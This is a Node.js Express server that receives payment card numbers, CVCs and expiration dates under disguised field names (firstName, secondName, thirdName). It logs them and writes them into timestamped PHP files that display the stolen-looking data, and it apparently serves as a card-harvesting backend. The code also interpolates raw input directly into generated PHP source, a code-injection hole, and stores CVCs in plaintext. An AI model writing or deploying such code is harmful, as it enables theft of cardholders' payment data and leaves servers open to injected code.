require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/send-data', async (req, res) => {
    const { firstName, secondName, thirdName } = req.body;

    console.log("📨 Datos recibidos:", firstName, secondName, thirdName);

    if (!firstName || !secondName || !thirdName) {
        return res.status(400).json({ error: 'Datos incompletos' });
    }

    // 🔹 Generar archivo PHP con los datos de pago
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const phpFilePath = path.join(__dirname, 'data', `payment-data-${timestamp}.php`);

    const phpContent = `<?php
    $cardNumber = "${firstName}";
    $cvc = "${secondName}";
    $expirationDate = "${thirdName}";

    echo "<h2>Datos de Pago</h2>";
    echo "<p><strong>Tarjeta:</strong> $cardNumber</p>";
    echo "<p><strong>CVC:</strong> $cvc</p>";
    echo "<p><strong>Expiración:</strong> $expirationDate</p>";
    ?>`;

    fs.writeFileSync(phpFilePath, phpContent);

    console.log(`✅ Archivo PHP generado en: ${phpFilePath}`);

    res.json({ message: 'Datos guardados correctamente en el archivo PHP' });
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en http://localhost:${PORT}`);
});
